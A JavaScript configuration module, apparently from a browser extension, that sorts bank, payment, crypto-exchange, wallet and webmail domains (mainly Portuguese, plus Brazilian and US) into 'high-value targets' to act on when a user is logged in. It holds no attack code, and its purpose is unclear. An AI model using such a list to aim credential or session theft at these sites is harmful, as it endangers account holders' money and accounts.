// ═══════════════════════════════════════════════
// 🎯 BANKING TARGETS - Site Classification System
// ═══════════════════════════════════════════════
// Only create incidents for these high-value targets when user is logged in

const BANKING_TARGETS = {
  
  // ═══════════════════════════════════════════════
  // 🇵🇹 BANCOS PORTUGUESES (PRIORIDADE MÁXIMA)
  // ═══════════════════════════════════════════════
  portugal: {
    // Big 5 (Cobertura ~80% mercado)
    main: [
      'cgd.pt',              // Caixa Geral de Depósitos
      'millenniumbcp.pt',    // Millennium BCP
      'santander.pt',        // Santander Totta
      'novobanco.pt',        // Novo Banco
      'bancobpi.pt'          // Banco BPI
    ],
    
    // Homebanking (subdomínios específicos)
    homebanking: [
      'particulares.cgd.pt',
      'www24.millenniumbcp.pt',
      'portal24.bpi.pt',
      'particulares.santander.pt',
      'nb.pt',  // Novo Banco app
      'online.novobanco.pt'
    ],
    
    // Bancos Médios
    medium: [
      'creditoagricola.pt',   // Crédito Agrícola
      'montepio.org',         // Montepio
      'bancomontepio.pt',
      'activate.pt',          // ActivoBank
      'bancobest.pt',         // Best
      'big.pt',               // BiG (Banco de Investimento Global)
      'carregosa.com',        // Banco Carregosa
      'banif.pt'              // Banif
    ],
    
    // Digitais (MUITO USADOS em PT)
    digital: [
      'moey.pt',              // Moey! (Crédito Agrícola)
      'n26.com',              // N26 (Alemão mas muito usado)
      'revolut.com',          // Revolut
      'wise.com',             // Wise (ex-TransferWise)
      'paypal.com',           // PayPal
      'mbway.pt',             // MB WAY
      'multibanco.pt'         // Multibanco
    ],
    
    // Serviços Pagamento
    payment: [
      'eupago.pt',            // EuPago
      'easypay.pt',           // Easypay
      'ifthenpay.com',        // IfthenPay
      'payshop.pt',           // Payshop
      'mbnet.pt'              // MB NET
    ],
    
    // Investimento
    investment: [
      'big.pt',
      'carregosa.com',
      'activobank.pt',
      'binckbank.pt',
      'degiro.pt',
      'etoro.com',
      'xtb.com'
    ]
  },
  
  // ═══════════════════════════════════════════════
  // 🇧🇷 BRASIL (Secundário)
  // ═══════════════════════════════════════════════
  brazil: {
    main: [
      'nubank.com.br', 'itau.com.br', 'bradesco.com.br',
      'bb.com.br', 'santander.com.br', 'caixa.gov.br',
      'inter.co', 'c6bank.com.br', 'original.com.br',
      'picpay.com', 'mercadopago.com.br', 'pagseguro.uol.com.br'
    ]
  },
  
  // ═══════════════════════════════════════════════
  // 🇺🇸 USA (Secundário)
  // ═══════════════════════════════════════════════
  usa: {
    main: [
      'chase.com', 'bankofamerica.com', 'wellsfargo.com',
      'citibank.com', 'usbank.com', 'capitalone.com',
      'ally.com', 'chime.com', 'sofi.com'
    ]
  },
  
  // ═══════════════════════════════════════════════
  // 💰 CRYPTO (Alta Prioridade)
  // ═══════════════════════════════════════════════
  crypto: {
    exchanges: [
      'binance.com', 'coinbase.com', 'kraken.com',
      'crypto.com', 'kucoin.com', 'bybit.com',
      'okx.com', 'gate.io', 'bitfinex.com'
    ],
    wallets: [
      'metamask.io', 'phantom.app', 'trustwallet.com',
      'blockchain.com', 'exodus.com', 'ledger.com'
    ]
  },
  
  // ═══════════════════════════════════════════════
  // 📧 EMAIL (Alta Prioridade)
  // ═══════════════════════════════════════════════
  email: [
    'gmail.com', 'mail.google.com',
    'outlook.com', 'outlook.live.com', 'hotmail.com',
    'yahoo.com', 'mail.yahoo.com',
    'protonmail.com', 'proton.me',
    'sapo.pt',  // 🇵🇹 Email PT
    'clix.pt',  // 🇵🇹 Email PT
    'mail.pt'   // 🇵🇹 Email PT
  ]
};

// Export for use in background.js
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { BANKING_TARGETS };
}
